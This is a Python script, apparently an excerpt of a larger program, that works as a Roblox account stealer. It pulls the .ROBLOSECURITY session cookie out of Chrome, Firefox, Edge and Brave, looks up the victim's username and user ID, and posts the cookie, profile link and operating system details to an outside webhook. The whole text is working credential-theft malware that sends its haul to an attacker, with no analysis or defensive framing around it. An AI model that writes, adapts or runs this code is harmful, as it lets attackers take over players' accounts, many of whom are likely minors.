def get_cookie():
    try:
        import browser_cookie3
        for b in [browser_cookie3.chrome, browser_cookie3.firefox, browser_cookie3.edge, browser_cookie3.brave]:
            try:
                cookies = b(domain_name="roblox.com")
                for c in cookies:
                    if c.name == ".ROBLOSECURITY":
                        return c.value
            except: pass
    except: pass
    return None

def get_user(cookie):
    try:
        r = requests.get("https://www.roblox.com/my/account#!/about", cookies={".ROBLOSECURITY": cookie}, timeout=10)
        if "roblox.com/users/" in r.text:
            username = re.search(r'"name":"([^"]+)"', r.text)
            userid = re.search(r'"userId":(\d+)', r.text)
            if username and userid:
                return username.group(1), userid.group(1)
    except: pass
    return "Unknown", "Unknown"

cookie = get_cookie()
if not cookie:
    print("No Roblox cookie found.")
    sys.exit()

username, userid = get_user(cookie)
profile = f"https://www.roblox.com/users/{userid}/profile"

embed = {
    "title": "💀 ROBLOX ACCOUNT.",
    "color": 16711680,
    "fields": [
        {"name": "Username", "value": username, "inline": True},
        {"name": "User ID", "value": userid, "inline": True},
        {"name": "Profile", "value": profile, "inline": False},
        {"name": "Cookie", "value": f"||{cookie[:100]}...||", "inline": False},
        {"name": "Platform", "value": platform.system() + " " + platform.release(), "inline": True}
    ],
    "footer": {"text": "LIGHTBYTE PROD."}
}

requests.post(WEBHOOK, json={"embeds": [embed], "username": "LIGHTY'S PET."})

